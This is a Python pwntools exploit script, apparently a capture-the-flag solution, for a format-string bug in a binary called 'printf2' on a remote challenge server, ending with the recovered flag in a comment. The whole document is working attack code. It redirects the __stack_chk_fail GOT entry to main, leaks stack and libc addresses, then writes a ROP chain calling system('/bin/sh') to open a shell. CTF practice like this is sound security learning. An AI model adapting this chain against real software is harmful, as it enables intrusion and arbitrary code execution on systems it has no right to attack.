from pwn import *


elf = context.binary = ELF("printf2")
libc = ELF("./a/libc.so.6")



# p = process()
p = remote("pwn.blitzhack.xyz",3333)
# p = remote("localhost",1337)


# pie leak given to us
p.recvuntil("e this: ")
pie_leak = int(p.recvline().strip(),16)
print("pie_leak",hex(pie_leak))
elf.address = pie_leak - elf.sym.main



# point the stack addr to the canary
p.sendline("24")

# overwrite stack got with main
payload = f"|%{8 + 65}$hhn".encode()
payload += b"|" * (255 - len(payload) - 7) 
main_ret = f"%{((elf.sym.main >> 8) & 0xff) - (8 - 2 - len(str((elf.sym.main >> 8) & 0xff)) )}c".ljust(8,"|").encode()
payload += f"%{11  + 0x31}c||||".encode() + b"%44$hhn|" + b"%203c|||" + main_ret +  b"%45$hhn|" + p64(elf.got["__stack_chk_fail"]) + p64(elf.got["__stack_chk_fail"] + 1)
p.sendline(payload)


# ret2main, we overwrote the got
# again this is to wait for the server 
# ignoreit
p.recvuntil("e this: ")
pie_leak = int(p.recvline().strip(),16)
print("pie_leak",hex(pie_leak))
elf.address = pie_leak - elf.sym.main


# leak stack
p.clean()
p.sendline("24")
payload = f"|%{8 + 65}$hhn".encode()
payload += b"|" * (255 - len(payload) - 7) 
payload += f"%76$p||||".encode()
p.sendline(payload)
p.recvuntil("||0x")
stack_leak = int(p.recvuntil("|")[:-1],16)
print("stack_leak",hex(stack_leak))


p.recvuntil("e this: ")
pie_leak = int(p.recvline().strip(),16)
print("pie_leak",hex(pie_leak))
elf.address = pie_leak - elf.sym.main


# leak libc
p.sendline("24")
payload = f"|%{8 + 65}$hhn".encode()
payload += b"|" * (255 - len(payload) - 7)
payload += f"%40$s|||".encode() + p64(elf.got.putchar)
p.sendline(payload)
p.recvuntil("|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
libc_leak = u64(p.recvuntil("|")[:-1].ljust(8,b"\x00"))
print("libc_leak",hex(libc_leak))


# leak libc
p.sendline("24")
payload = f"|%{8 + 65}$hhn".encode()
payload += b"|" * (255 - len(payload) - 7)
payload += f"%40$s|||".encode() + p64(elf.got.puts)
p.sendline(payload)
p.recvuntil("|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
libc_leak = u64(p.recvuntil("|")[:-1].ljust(8,b"\x00"))
print("libc_leak",hex(libc_leak))


# leak libc
p.sendline("24")
payload = f"|%{8 + 65}$hhn".encode()
payload += b"|" * (255 - len(payload) - 7)
payload += f"%40$s|||".encode() + p64(elf.got.read)
p.sendline(payload)
p.recvuntil("|||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||")
libc_leak = u64(p.recvuntil("|")[:-1].ljust(8,b"\x00"))
print("libc_leak",hex(libc_leak))



# rop
libc = ELF("libc.so")
libc.address = libc_leak - 0x1147d0
# libc.address = libc_leak - 0x89cd0
print("libc.address",hex(libc.address))

# gdb.attach(p)

rop = ROP(libc)
p.sendline("0")
print(hex(rop.rdi.address))
payload = fmtstr_payload(8,{
    stack_leak - 0x6b8 + 8 * 0 : rop.rdi.address,
    stack_leak - 0x6b8 + 8 * 1 : next(libc.search(b"/bin/sh\x00")),
    stack_leak - 0x6b8 + 8 * 2 : rop.ret.address,
    stack_leak - 0x6b8 + 8 * 3 : libc.sym.system,
})
p.sendline(payload)
        

p.interactive()

# Blitz{fsb_r3v3ng3_unleashed_badd3ae1c9}